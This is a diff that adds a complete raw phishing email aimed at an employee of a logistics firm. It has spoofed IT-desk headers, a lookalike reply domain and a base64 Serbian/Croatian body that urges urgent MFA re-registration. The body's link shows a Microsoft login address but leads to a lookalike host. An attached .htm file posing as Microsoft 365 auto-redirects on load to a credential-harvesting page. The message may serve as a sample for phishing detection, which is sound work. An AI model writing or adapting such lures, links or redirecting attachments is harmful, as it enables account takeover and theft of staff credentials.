@@ -1,0 +1,54 @@
+Return-Path: <bounce+jkovac=drinalog.example@mail.drinalog-sso.example>
+Delivered-To: jelena.kovac@drinalog.example
+Received: from mx01.drinalog.example (localhost [127.0.0.1])
+	by mbox01.drinalog.example (Postfix) with ESMTP id 7C2E31A0042
+	for <jelena.kovac@drinalog.example>; Tue, 13 Oct 2026 07:42:11 +0000 (UTC)
+Authentication-Results: mx01.drinalog.example;
+	spf=pass (sender IP is 198.51.100.61) smtp.mailfrom=mail.drinalog-sso.example;
+	dkim=pass (2048-bit key) header.d=drinalog-sso.example header.s=s1 header.b=Qm3k9X2a;
+	dmarc=fail (p=none dis=none) header.from=drinalog.example
+Received-SPF: Pass (mailfrom) identity=mailfrom; client-ip=198.51.100.61; helo=mail.drinalog-sso.example; envelope-from=<bounce+jkovac=drinalog.example@mail.drinalog-sso.example>; receiver=<UNKNOWN>
+Received: from mail.drinalog-sso.example (mail.drinalog-sso.example [198.51.100.61])
+	by mx01.drinalog.example (Postfix) with ESMTPS id 4Hq2Lk0Zc9z9sWX
+	for <jelena.kovac@drinalog.example>; Tue, 13 Oct 2026 07:42:10 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=drinalog-sso.example; s=s1;
+	t=1791877327; h=from:reply-to:to:subject:date:message-id:mime-version;
+	bh=8m4Vq1Yb0f5mJ4f0tC3WbJgq7x0b1n2u3PZ0kq2nX8M=;
+	b=Qm3k9X2aT0r7cV2lH9pYwF4uE1sK8dN6zR3jB5mL0qA7xW2vC9tG1hU4yS6oP3nM
+From: "Drina IT podrska" <it-podrska@drinalog.example>
+Reply-To: <it-podrska@drinalog-sso.example>
+To: "Jelena Kovac" <jelena.kovac@drinalog.example>
+Subject: =?UTF-8?Q?Hitno:_potvrdite_MFA_registraciju_do_12h?=
+Date: Tue, 13 Oct 2026 09:42:07 +0200
+Message-ID: <20261013074207.5f1c2a@mail.drinalog-sso.example>
+X-Mailer: PHPMailer 6.9.1 (https://github.com/PHPMailer/PHPMailer)
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="b1_9f2c4e7a"
+
+--b1_9f2c4e7a
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: base64
+
+PGh0bWw+PGJvZHkgc3R5bGU9ImZvbnQtZmFtaWx5OlNlZ29lIFVJLEFyaWFsLHNhbnMtc2VyaWYi
+Pgo8cD5Qb8WhdG92YW5hIEplbGVuYSw8L3A+CjxwPlpib2cgbm92ZSBzaWd1cm5vc25lIHBvbGl0
+aWtlIHN2ZSBuYWxvZ2UgbW9yYW1vIHBvbm92byByZWdpc3Ryb3ZhdGkgemEgdmnFoWVmYWt0b3Jz
+a3UgYXV0ZW50aWthY2lqdQo8Yj5kbyAxMjowMCBkYW5hczwvYj4uIE5hbG96aSBrb2ppIG5lIHph
+dnLFoWUgcmVnaXN0cmFjaWp1IGJpxIdlIHByaXZyZW1lbm8gYmxva2lyYW5pLjwvcD4KPHA+PGEg
+aHJlZj0iaHR0cHM6Ly9sb2dpbi5kcmluYWxvZy1zc28uZXhhbXBsZS9jb21tb24vb2F1dGgyL2F1
+dGhvcml6ZT9jbGllbnRfaWQ9NDc2NTQ0NWImYW1wO3U9amVsZW5hLmtvdmFjJTQwZHJpbmFsb2cu
+ZXhhbXBsZSI+aHR0cHM6Ly9sb2dpbi5taWNyb3NvZnRvbmxpbmUuY29tL2NvbW1vbi9tZmEtcmVn
+aXN0cmF0aW9uPC9hPjwvcD4KPHA+VXB1dHN0dm8gamUgdSBwcmlsb2d1LjwvcD4KPHA+SVQgcG9k
+csWha2E8YnI+RHJpbmEgTG9naXN0aWthIGQuby5vLjwvcD4KPC9ib2R5PjwvaHRtbD4K
+
+--b1_9f2c4e7a
+Content-Type: text/html; name="MFA-registracija.htm"
+Content-Disposition: attachment; filename="MFA-registracija.htm"
+Content-Transfer-Encoding: base64
+
+PCFET0NUWVBFIGh0bWw+CjxodG1sPjxoZWFkPjxtZXRhIGNoYXJzZXQ9InV0Zi04Ij48dGl0bGU+
+TWljcm9zb2Z0IDM2NTwvdGl0bGU+PC9oZWFkPgo8Ym9keSBvbmxvYWQ9IndpbmRvdy5sb2NhdGlv
+bi5ocmVmPSdodHRwczovL2xvZ2luLmRyaW5hbG9nLXNzby5leGFtcGxlL2NvbW1vbi9sb2dpbj91
+PWplbGVuYS5rb3ZhYyU0MGRyaW5hbG9nLmV4YW1wbGUmYW1wO3I9bWZhJyI+CjxwPlXEjWl0YXZh
+bmplLi4uPC9wPgo8L2JvZHk+PC9odG1sPgo=
+
+--b1_9f2c4e7a--
